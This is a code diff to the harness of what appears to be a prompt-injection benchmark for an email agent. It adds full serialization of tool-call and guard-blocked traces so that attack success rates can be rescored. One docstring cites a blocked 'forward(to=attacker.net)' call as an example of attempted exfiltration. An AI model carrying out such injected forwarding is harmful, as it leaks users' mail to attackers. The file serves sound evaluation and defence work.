@@ -18,7 +18,7 @@ import json
 from pathlib import Path
 from typing import Any
 
-from src.agent import SYSTEM_PROMPT, build_agent
+from src.agent import DESTRUCTIVE, SYSTEM_PROMPT, build_agent
 
 DATA_DIR = Path(__file__).resolve().parent.parent / "data"
 RESULTS_DIR = Path(__file__).resolve().parent.parent / "results"
@@ -124,6 +124,8 @@ def run_benign(
             "passed": _benign_passes(task["id"], session),
             "actions": [a["tool"] for a in session.actions],
             "blocked": [b["tool"] for b in session.blocked],
+            "action_trace": serialize_actions(session.actions),
+            "blocked_trace": serialize_blocked(session.blocked),
         })
     pass_rate = sum(r["passed"] for r in results) / len(results)
     summary = {"label": label, "model": model_name, "pass_rate": pass_rate,
@@ -183,6 +185,42 @@ def coerce_action_result(action: dict) -> dict:
         except Exception:
             return {}
     return r if isinstance(r, dict) else {}
+
+
+def serialize_actions(actions: list[dict]) -> list[dict]:
+    """Full tool-call records, so a run can be rescored after the fact.
+
+    Result files used to store tool *names* only, which froze every ASR at
+    whatever REPLY_EXFIL_MIN_BODY / HIGH_VALUE_EMAILS happened to be set to
+    when the run happened: the sensitivity those constants induce was
+    unmeasurable on exactly the numbers it most affected.
+
+    Read-tool results are dropped: `list_inbox` returns the whole inbox on
+    every call and `read_email` returns a body already present in the attack
+    log's `injected_inbox`. That is a file-size choice, not a scoring one —
+    no scorer reads those results. Destructive-tool results are kept in full
+    because `send_reply`'s recipient exists only there, not in its args.
+    """
+    out = []
+    for a in actions:
+        rec = {"tool": a["tool"], "args": a.get("args", {})}
+        if a["tool"] in DESTRUCTIVE:
+            rec["result"] = coerce_action_result(a)
+        out.append(rec)
+    return out
+
+
+def serialize_blocked(blocked: list[dict]) -> list[dict]:
+    """Full records for guard-blocked calls.
+
+    A blocked `forward(to=attacker.net)` is an attempted exfiltration that a
+    guard prevented; keeping its arguments is what lets a later pass grade
+    attempts by severity rather than only counting them.
+    """
+    return [
+        {"tool": b["tool"], "args": b.get("args", {}), "reason": b.get("reason", "")}
+        for b in blocked
+    ]
 
 
 # ---------- attack tasks (driven by attack_log.jsonl rows) ----------
@@ -271,6 +309,8 @@ def run_attack_replay(
             "attacker_won": attacker_won,
             "actions": [a["tool"] for a in session.actions],
             "blocked": [b["tool"] for b in session.blocked],
+            "action_trace": serialize_actions(session.actions),
+            "blocked_trace": serialize_blocked(session.blocked),
         })
 
     asr = {cat: sum(v) / len(v) for cat, v in by_cat.items() if v}
